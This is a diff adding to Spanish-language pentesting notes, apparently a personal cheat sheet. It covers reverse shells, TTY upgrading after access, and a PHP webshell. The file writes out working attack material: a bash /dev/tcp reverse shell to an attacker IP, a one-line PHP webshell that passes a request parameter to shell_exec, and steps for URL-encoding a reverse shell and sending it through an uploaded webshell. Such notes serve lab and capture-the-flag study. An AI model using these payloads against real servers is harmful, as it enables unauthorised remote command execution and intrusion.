@@ -96,3 +96,44 @@ nc -nlvp 4444
 ```bash
 bash -c "sh -i >& /dev/tcp/<IP máquina atacante/4444 0>&1"
 ```
+
+## Primeros pasos tras la Intrusión (Tratamiento de la TTY)
+
+Al hacer la Reverse Shell tenemos que hacer los siguientes comandos para trabajar más cómodamente en la máquina víctima.
+
+```bash
+script /dev/null -c bash
+CTRL+Z
+stty raw -echo; fg
+reset xterm
+export TERM=xterm
+export SHELL=bash
+```
+
+## Obtener Intrusión a Servidor Mediante uso de una Webshell
+
+Una Webshell es un archivo que se sube a un servidor para la ejecución remota de comandos.
+
+```bash
+<?php
+   echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
+?>
+```
+
+Por lo que se podría hacer ahora.
+
+```bash
+http://<IP máquina víctima>/uploads/archivo.php?cmd=whoami
+```
+
+Para hacer URL una Reverse Shell en Burpuiste entrar en la opción de Decoder.
+
+```bash
+bash -c "bash -i>&/dev/tcp/<IP máquina atacante>/443 0>&1"
+```
+
+Tras esto dar a la opción **Encode as URL**.
+
+```bash
+http://<IP máquina víctima>/uploads/archivo.php?cmd=<URL encodeada>
+```
